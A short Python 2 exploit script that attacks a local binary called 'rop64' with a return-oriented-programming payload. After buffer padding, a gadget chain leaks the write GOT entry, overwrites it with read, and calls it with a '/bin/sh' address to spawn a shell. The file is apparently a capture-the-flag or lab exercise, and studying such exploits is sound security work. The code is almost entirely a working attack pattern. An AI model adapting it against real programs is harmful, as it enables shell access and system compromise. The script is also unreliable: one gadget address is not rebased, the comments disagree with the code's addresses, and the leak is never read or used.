# rop64.py
import struct
import subprocess
import os
import pty
import time

def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\x20':
        return res
  except:
    raise

def read(fd, n):
  return os.read(fd, n)

def writeline(proc, data):
  try:
    proc.stdin.write(data + "\n")
  except:
    raise

def p64(val):
  return struct.pack("<Q", val)

def u64(data):
  return struct.unpack("<Q", data)[0]

out_r, out_w = pty.openpty()
s = subprocess.Popen("./rop64", stdin=subprocess.PIPE, stdout=out_w)

print `read(out_r, 6)`

# write(1, 0x601018, 8)
payload  = "A"*264         # buf padding
payload += p64(0x1149)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(1)          # fd
payload += p64(0x555555558018)   # write@got
payload += p64(8)          # 8 
payload += p64(0x555555555030)   # write_plt 
# read(0, 0x601018, 16)
payload += p64(0x1149)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(0)          # fd
payload += p64(0x555555558018)   # write@got
payload += p64(16)          # 8
payload += p64(0x555555555040)   # read@plt
# write(0x601020,0,0)
payload += p64(0x1149)   # pop rdi; pop rsi; pop rdx; ret
payload += p64(0x7ffff7f741ac)   # /bin/sh
payload += p64(0)          # 0
payload += p64(0)          # 0
payload += p64(0x555555555030)   # write@plt

writeline(s, payload)
